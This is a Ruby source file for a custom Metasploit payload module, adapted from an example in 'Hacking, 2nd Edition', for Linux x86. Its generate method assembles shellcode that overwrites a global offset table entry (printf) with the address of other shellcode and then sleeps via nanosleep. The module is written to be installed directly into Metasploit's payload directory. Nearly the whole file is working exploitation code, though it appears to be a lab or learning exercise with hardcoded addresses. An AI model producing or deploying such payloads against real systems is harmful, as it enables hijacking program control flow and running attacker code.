##
# setresuid_geteuid_exec.rb
#
# this is a modified version of exec_shell.s, made by Jon Erickson for the book
# "Hacking, 2nd Edition". the original source is available here:
# http://www.nostarch.com/download/booksrc.zip
#
# you can drop this in ~/.msf4/modules/payloads/singles/linux/x86/
#
# TODO:
#   - check shell_reverse_tcp2.rb ("Metasm demo")
##

require 'metasm'
require 'msf/core'

module MetasploitModule
        # http://dev.metasploit.com/redmine/projects/framework/wiki/Exploit_Ranking
        Rank = NormalRanking

	include Msf::Payload::Single
	include Msf::Payload::Linux

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Linux overwrite GOT and nanosleep',
			'Version'       => '0.1.2',
			'Description'   => %q{
					This payload overwrites the global offset table (GOT) with an address to another payload and falls into nanosleep.
			},
			'Author'        => 'pyllyukko',
			'License'       => MSF_LICENSE,
			'Platform'      => 'linux',
			'Arch'          => ARCH_X86))
	end

	#
	# Dynamically builds the exec payload based on the user's options.
	#
	def generate
		payload_data = <<EOS
; this is the GOT we want to overwrite
; 0804a000 R_386_JUMP_SLOT   printf
	mov eax,0x804a010
	xor al,al
; move address of the actual shellcode to EBX
	mov ebx,0xffffd904

; write it
	mov [eax],ebx

; nanosleep
; int nanosleep(const struct timespec *req, struct timespec *rem);
; http://mike820324.blogspot.com/2011/07/shell-code-4cont.html
	xor eax,eax
	push eax	; NULLs to the stack...
	mov al,162
	push 50		; sleep for 50 sec
	mov ebx,esp	; move pointer to ebx
	xor ecx,ecx	; ECX = NULL
	push ecx	; do we need to NULL terminate???
	xor edx,edx	; not sure if this is necessary...
	int 0x80
EOS
		the_payload = Metasm::Shellcode.assemble(Metasm::Ia32.new, payload_data).encode_string
	end

end
